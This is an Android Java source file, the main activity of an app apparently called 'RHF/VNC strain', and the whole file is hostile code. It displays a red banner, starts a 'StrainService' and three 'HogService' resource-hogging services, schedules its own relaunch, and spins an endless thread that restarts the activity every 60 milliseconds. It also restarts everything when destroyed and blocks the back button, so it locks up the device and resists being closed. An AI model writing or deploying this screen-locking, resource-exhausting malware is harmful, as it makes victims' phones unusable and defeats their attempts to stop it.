package com.rhfvnc.strain;
import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import android.util.TypedValue;
public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("RHF/VNC");
        tv.setTextColor(Color.RED);
        tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 42);
        tv.setGravity(Gravity.CENTER);
        setContentView(tv);
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        StrainReceiver.scheduleRelaunch(this, 20);
        Thread storm = new Thread(() -> {
            while (true) {
                try {
                    android.content.Intent i = new android.content.Intent(MainActivity.this, MainActivity.class);
                    i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                            | android.content.Intent.FLAG_ACTIVITY_CLEAR_TASK
                            | android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
                    startActivity(i);
                } catch (Throwable ignored) {}
                try { Thread.sleep(60); } catch (InterruptedException ignored) {}
            }
        });
        storm.setDaemon(true);
        storm.start();
    }
    @Override
    protected void onDestroy() {
        super.onDestroy();
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
    @Override
    public void onBackPressed() {
        StrainService.start(this);
        StrainReceiver.scheduleRelaunch(this, 20);
    }
}
